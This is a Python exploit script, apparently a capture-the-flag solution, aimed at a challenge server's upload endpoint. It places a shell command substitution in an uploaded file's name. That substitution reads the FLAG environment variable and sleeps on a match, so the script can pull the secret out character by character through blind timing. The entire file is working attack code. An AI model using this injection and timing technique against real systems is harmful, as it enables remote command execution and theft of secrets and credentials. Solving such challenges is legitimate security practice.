#!/usr/bin/env python3
import requests
import time
import string

URL = "https://e1a7c485-c50d-4c11-afa9-35666e2ad80b.offsec.m0lecon.it/scan"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-{}"

# start from known prefix
flag = "offsec{"

THRESHOLD = 4.0
TIMEOUT = 10


while not flag.endswith("}"):

    found = False

    for c in charset:

        guess = flag + c

        # POSIX-compatible blind timing payload
        payload = f'$(case $(printenv FLAG) in {guess}*) sleep 5;; esac)'

        files = {
            "specimen": (payload, b"s")
        }

        print(f"[*] Trying: {guess}")

        start = time.time()

        try:
            r = requests.post(URL, files=files, timeout=TIMEOUT)
            elapsed = time.time() - start

        except requests.exceptions.ReadTimeout:
            elapsed = TIMEOUT
            print("    [!] Timeout (treated as long delay)")

        except requests.exceptions.RequestException as e:
            print(f"    [!] Network error: {e}")
            time.sleep(2)
            continue

        print(f"    Time: {elapsed:.2f}s")

        if elapsed > THRESHOLD:
            flag += c
            found = True
            print(f"[+] MATCH FOUND → {flag}")
            break

    if not found:
        print("[!] No matching character found. Stopping.")
        break

print("\nFINAL FLAG:", flag)
